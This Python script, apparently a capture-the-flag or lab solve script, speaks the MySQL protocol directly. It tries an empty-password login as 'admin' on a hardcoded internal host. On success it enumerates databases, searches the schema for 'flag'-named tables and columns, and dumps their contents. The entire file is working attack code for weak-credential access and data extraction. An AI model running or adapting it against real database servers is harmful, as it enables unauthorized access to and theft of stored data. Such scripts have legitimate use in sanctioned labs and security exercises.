import json
import re
import socket
import struct

HOST = "192.168.2.254"
PORT = 3306
TIMEOUT = 6
SUPPORTED_PLUGINS = {"mysql_native_password", "caching_sha2_password"}


def read_exact(sock, count):
    chunks = []
    remaining = count
    while remaining:
        chunk = sock.recv(remaining)
        if not chunk:
            raise ConnectionError("peer closed the connection while a packet was incomplete")
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def recv_packet(sock):
    header = read_exact(sock, 4)
    length = header[0] | (header[1] << 8) | (header[2] << 16)
    sequence = header[3]
    return sequence, read_exact(sock, length)


def send_packet(sock, payload, sequence):
    length = len(payload)
    header = bytes((length & 255, (length >> 8) & 255, (length >> 16) & 255, sequence & 255))
    sock.sendall(header + payload)


def nul_string(data, offset):
    end = data.find(b"\x00", offset)
    if end < 0:
        raise ValueError("malformed handshake: missing NUL-terminated string")
    return data[offset:end], end + 1


def parse_handshake(payload):
    if not payload:
        raise ValueError("empty server handshake")
    if payload[0] == 0xff:
        raise ValueError("server returned an error instead of a handshake: " + payload[1:].hex())
    if payload[0] != 10:
        raise ValueError("unsupported MySQL protocol version byte: %d" % payload[0])
    version_raw, pos = nul_string(payload, 1)
    if len(payload) < pos + 4 + 8 + 1 + 2:
        raise ValueError("truncated MySQL handshake")
    connection_id = struct.unpack_from("<I", payload, pos)[0]
    pos += 4
    salt1 = payload[pos:pos + 8]
    pos += 8
    pos += 1  # filler
    cap_low = struct.unpack_from("<H", payload, pos)[0]
    pos += 2
    capabilities = cap_low
    plugin = None
    salt = salt1
    if pos < len(payload):
        if len(payload) < pos + 1 + 2 + 2 + 1 + 10:
            raise ValueError("truncated extended MySQL handshake")
        pos += 1  # server character set
        pos += 2  # status flags
        cap_high = struct.unpack_from("<H", payload, pos)[0]
        pos += 2
        capabilities |= cap_high << 16
        auth_len = payload[pos]
        pos += 1
        pos += 10  # reserved
        if capabilities & 0x00008000:
            tail_len = max(13, auth_len - 8) if auth_len else 13
            tail = payload[pos:pos + min(tail_len, max(0, len(payload) - pos))]
            salt += tail.rstrip(b"\x00")
            pos += len(tail)
        if capabilities & 0x00080000 and pos < len(payload):
            plugin_raw = payload[pos:].split(b"\x00", 1)[0]
            plugin = plugin_raw.decode("ascii", "replace") or None
    return {
        "server_version": version_raw.decode("ascii", "replace"),
        "connection_id": connection_id,
        "capabilities": capabilities,
        "authentication_plugin": plugin,
        "salt_length": len(salt),
    }


def mysql_error(payload):
    if not payload or payload[0] != 0xff:
        return None
    code = struct.unpack_from("<H", payload, 1)[0] if len(payload) >= 3 else None
    pos = 3
    sql_state = None
    if len(payload) >= 9 and payload[3:4] == b"#":
        sql_state = payload[4:9].decode("ascii", "replace")
        pos = 9
    return {"code": code, "sql_state": sql_state, "message": payload[pos:].decode("utf-8", "replace")}


def lenenc_int(data, offset=0):
    if offset >= len(data):
        raise ValueError("missing length-encoded integer")
    first = data[offset]
    if first < 0xfb:
        return first, offset + 1
    if first == 0xfb:
        return None, offset + 1
    if first == 0xfc:
        return int.from_bytes(data[offset + 1:offset + 3], "little"), offset + 3
    if first == 0xfd:
        return int.from_bytes(data[offset + 1:offset + 4], "little"), offset + 4
    if first == 0xfe:
        return int.from_bytes(data[offset + 1:offset + 9], "little"), offset + 9
    raise ValueError("invalid length-encoded integer")


def parse_text_row(payload, count):
    values = []
    pos = 0
    for _ in range(count):
        size, pos = lenenc_int(payload, pos)
        if size is None:
            values.append(None)
        else:
            if pos + size > len(payload):
                raise ValueError("truncated text-protocol row")
            values.append(payload[pos:pos + size].decode("utf-8", "replace"))
            pos += size
    return values


def query(sock, sql):
    send_packet(sock, b"\x03" + sql.encode("utf-8"), 0)
    seq, first = recv_packet(sock)
    err = mysql_error(first)
    if err:
        return {"query": sql, "status": "error", "error": err}
    if first and first[0] == 0x00:
        return {"query": sql, "status": "ok", "response_hex": first.hex()}
    count, _ = lenenc_int(first, 0)
    if count is None or count > 4096:
        return {"query": sql, "status": "unparsed", "first_response_hex": first.hex()}
    for _ in range(count):
        _, _column = recv_packet(sock)
    _, marker = recv_packet(sock)
    if not (marker[:1] == b"\xfe" and len(marker) < 9) and marker[:1] != b"\x00":
        # Some server variants omit the legacy column terminator.
        pending = marker
    else:
        pending = None
    rows = []
    if pending is not None:
        err = mysql_error(pending)
        if err:
            return {"query": sql, "status": "error", "error": err}
        rows.append(parse_text_row(pending, count))
    while True:
        _, packet = recv_packet(sock)
        err = mysql_error(packet)
        if err:
            return {"query": sql, "status": "error", "error": err, "rows": rows}
        if packet[:1] == b"\xfe" and len(packet) < 9:
            break
        if packet[:1] == b"\x00" and len(packet) >= 7:
            # A legacy EOF/OK terminator may be represented by an OK packet.
            break
        rows.append(parse_text_row(packet, count))
        if len(rows) >= 1000:
            return {"query": sql, "status": "row_limit", "rows": rows}
    return {"query": sql, "status": "ok", "rows": rows}


def quote_identifier(value):
    return "`" + value.replace("`", "``") + "`"


def main():
    result = {
        "target": "%s:%d" % (HOST, PORT),
        "credential_attempt": {"username": "admin", "password": "", "password_source": "no password supplied; one empty-password attempt only"},
        "authentication": {"attempted": False, "status": "not_attempted"},
        "queries": [],
        "flag_like_values": [],
    }
    try:
        with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as sock:
            sock.settimeout(TIMEOUT)
            _, greeting = recv_packet(sock)
            handshake = parse_handshake(greeting)
            result["handshake"] = handshake
            plugin = handshake.get("authentication_plugin")
            if plugin not in SUPPORTED_PLUGINS:
                result["authentication"] = {
                    "attempted": False,
                    "status": "not_attempted_unsupported_or_unidentified_plugin",
                    "observed_plugin": plugin,
                    "supported_by_script": sorted(SUPPORTED_PLUGINS),
                }
                print(json.dumps(result, ensure_ascii=False, indent=2))
                return

            client_caps = 0x00000200 | 0x00008000 | 0x00080000  # protocol41, secure connection, plugin auth
            server_caps = handshake["capabilities"]
            client_caps &= server_caps
            if not (client_caps & 0x00000200):
                result["authentication"] = {"attempted": False, "status": "not_attempted_protocol_41_not_advertised"}
                print(json.dumps(result, ensure_ascii=False, indent=2))
                return
            response = struct.pack("<I", client_caps) + struct.pack("<I", 16 * 1024 * 1024) + bytes([45]) + b"\x00" * 23
            response += b"admin\x00\x00"  # username and zero-length authentication response
            if client_caps & 0x00080000:
                response += plugin.encode("ascii") + b"\x00"
            send_packet(sock, response, 1)
            seq, auth_reply = recv_packet(sock)
            auth_error = mysql_error(auth_reply)
            if auth_error:
                result["authentication"] = {"attempted": True, "status": "rejected", "plugin": plugin, "error": auth_error}
                print(json.dumps(result, ensure_ascii=False, indent=2))
                return

            # Handle a same-plugin auth switch with the same empty response. Do not
            # attempt password, TLS, or RSA-based full authentication challenges.
            if auth_reply[:1] == b"\xfe" and len(auth_reply) > 1:
                switched = auth_reply[1:].split(b"\x00", 1)[0].decode("ascii", "replace")
                result["authentication"]["auth_switch_plugin"] = switched
                if switched not in SUPPORTED_PLUGINS:
                    result["authentication"].update({"attempted": True, "status": "inconclusive_unsupported_auth_switch", "plugin": plugin})
                    print(json.dumps(result, ensure_ascii=False, indent=2))
                    return
                send_packet(sock, b"", (seq + 1) & 255)
                seq, auth_reply = recv_packet(sock)
                auth_error = mysql_error(auth_reply)
                if auth_error:
                    result["authentication"] = {"attempted": True, "status": "rejected", "plugin": switched, "error": auth_error}
                    print(json.dumps(result, ensure_ascii=False, indent=2))
                    return

            if auth_reply[:2] == b"\x01\x04":
                result["authentication"] = {"attempted": True, "status": "inconclusive_server_requires_full_authentication", "plugin": plugin, "detail": "No password or TLS/RSA material was provided; no full-auth response was sent."}
                print(json.dumps(result, ensure_ascii=False, indent=2))
                return
            if not auth_reply or auth_reply[0] != 0x00:
                result["authentication"] = {"attempted": True, "status": "inconclusive_unrecognized_auth_response", "plugin": plugin, "response_hex": auth_reply.hex()}
                print(json.dumps(result, ensure_ascii=False, indent=2))
                return

            result["authentication"] = {"attempted": True, "status": "accepted", "plugin": plugin, "username": "admin"}
            identity = query(sock, "SELECT DATABASE(), CURRENT_USER(), USER(), VERSION()")
            result["queries"].append(identity)
            databases = query(sock, "SHOW DATABASES")
            result["queries"].append(databases)
            if databases.get("status") == "ok":
                db_names = [row[0] for row in databases.get("rows", []) if row and row[0]]
                metadata_sql = "SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.columns WHERE (LOWER(TABLE_NAME) LIKE '%flag%' OR LOWER(COLUMN_NAME) LIKE '%flag%')"
                meta = query(sock, metadata_sql)
                result["queries"].append(meta)
                candidates = meta.get("rows", []) if meta.get("status") == "ok" else []
                for row in candidates[:30]:
                    if len(row) < 3 or not all(row[:3]):
                        continue
                    schema, table, column = row[:3]
                    if schema not in db_names:
                        continue
                    sql = "SELECT %s FROM %s.%s LIMIT 20" % (quote_identifier(column), quote_identifier(schema), quote_identifier(table))
                    found = query(sock, sql)
                    result["queries"].append(found)
                    for data_row in found.get("rows", []):
                        for value in data_row:
                            if value and re.search(r"flag\s*\{|\bflag\b", value, re.IGNORECASE):
                                result["flag_like_values"].append({"schema": schema, "table": table, "column": column, "value": value})

    except Exception as exc:
        result["execution_error"] = {"type": type(exc).__name__, "message": str(exc)}
    print(json.dumps(result, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()

